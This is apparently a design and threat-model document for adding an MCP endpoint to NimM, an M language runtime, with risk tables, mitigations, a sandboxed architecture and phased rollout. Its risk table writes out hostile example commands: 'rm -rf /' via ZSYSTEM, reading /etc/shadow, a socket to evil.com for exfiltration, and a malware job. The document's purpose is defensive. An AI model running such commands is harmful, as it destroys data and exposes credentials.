# MCP Endpoint for NimM — Design & Security Analysis

## What Could Be Done via MCP

| Capability | Use Case | Risk Level |
|---|---|---|
| **Execute M code** | AI runs M expressions, gets results | 🔴 High |
| **Read/write globals** | AI queries/modifies LMDB database | 🟡 Medium |
| **Load routines** | AI loads .m files, executes them | 🟡 Medium |
| **Run tests** | AI executes conformance suites | 🟢 Low |
| **Static analysis** | AI runs ZANALYZE on code | 🟢 Low |
| **Transactions** | AI manages TSTART/TCOMMIT/TROLLBACK | 🟡 Medium |
| **Network ops** | AI opens sockets, sends/receives data | 🔴 High |
| **Debugger** | AI sets breakpoints, inspects state | 🟡 Medium |

## Security Implications

### Critical Risks

| Risk | Vector | Impact |
|---|---|---|
| **Arbitrary code execution** | `ZSYSTEM "rm -rf /"` | Full system compromise |
| **Shell access** | `ZSYSTEM "cat /etc/passwd"` | Data exfiltration |
| **File system access** | `OPEN 1:"/etc/shadow":READ` | Credential theft |
| **Network access** | `NIOPEN tcp:evil.com:80` | Data exfiltration, C2 |
| **Process spawning** | `JOB ^MALWARE` | Persistent backdoor |
| **Database access** | `KILL ^SENSITIVE_DATA` | Data destruction |
| **Resource exhaustion** | `FOR I=1:1:0 W I` | DoS |

### Mitigations

| Mitigation | Implementation | Priority |
|---|---|---|
| **Sandboxing** | Container/VM with limited resources | Critical |
| **Authentication** | API keys, tokens, mTLS | Critical |
| **Authorization** | Command/function allowlists | Critical |
| **Rate limiting** | Requests per minute, concurrent sessions | High |
| **Input validation** | Sanitize M code, block dangerous patterns | High |
| **Resource limits** | Timeout, memory cap, max iterations | High |
| **Audit logging** | Log all operations with timestamps | High |
| **Network isolation** | Block outbound connections from NimM | High |
| **Read-only mode** | Disable SET/KILL/LOCK/NIWRITE | Medium |
| **Disable dangerous commands** | Block ZSYSTEM, JOB, OPEN on sensitive paths | Medium |

## Recommended Architecture

```
┌─────────────┐     ┌──────────────┐     ┌─────────────┐
│  AI Client  │────▶│  MCP Server  │────▶│    NimM     │
│             │     │  (auth,      │     │  (sandboxed │
│             │     │   rate limit,│     │   container)│
│             │     │   validation)│     │             │
└─────────────┘     └──────────────┘     └─────────────┘
                           │                     │
                           ▼                     ▼
                    ┌──────────────┐     ┌─────────────┐
                    │  Audit Log   │     │    LMDB     │
                    │              │     │  (isolated) │
                    └──────────────┘     └─────────────┘
```

**Key principle:** The MCP server is the trust boundary. It authenticates, authorizes, validates, rate-limits, and logs. NimM runs in a sandboxed container with no direct network access, limited resources, and a dedicated LMDB instance.

## Safe Starting Point

Start with **read-only mode** — allow:
- `WRITE`, `ZWRITE`, `ZANALYZE`, `$DATA`, `$ORDER`, `$QUERY`, `$GET`
- Test execution (`run_all_tests`, conformance suites)
- Static analysis

Block:
- `SET`, `KILL`, `LOCK`, `MERGE`, `OPEN`, `NIOPEN`, `JOB`, `ZSYSTEM`
- File I/O, network, process spawning

This gives AI useful M code analysis capabilities without execution risk.

## Implementation Phases

### Phase 1: Read-Only MCP Server
- Wire `mcp_server.nim` to main.nim with `--mcp` flag
- Implement tool: `execute_m_code` (read-only commands only)
- Implement tool: `read_global` (GET, ORDER, QUERY, DATA)
- Implement tool: `run_tests` (conformance suites)
- Implement tool: `analyze_code` (ZANALYZE)
- Authentication via API key
- Audit logging

### Phase 2: Sandboxed Write Access
- Container isolation (Docker/VM)
- Resource limits (timeout, memory, iterations)
- Write commands: SET, KILL, LOCK, MERGE
- Transaction support: TSTART/TCOMMIT/TROLLBACK
- Rate limiting

### Phase 3: Full Access (Production)
- Network commands: NIOPEN/NILISTEN/NIREAD/NIWRITE/NICLOSE
- Process spawning: JOB
- File I/O: OPEN/READ/WRITE/CLOSE
- Shell access: ZSYSTEM (with allowlist)
- mTLS authentication
- Full audit trail
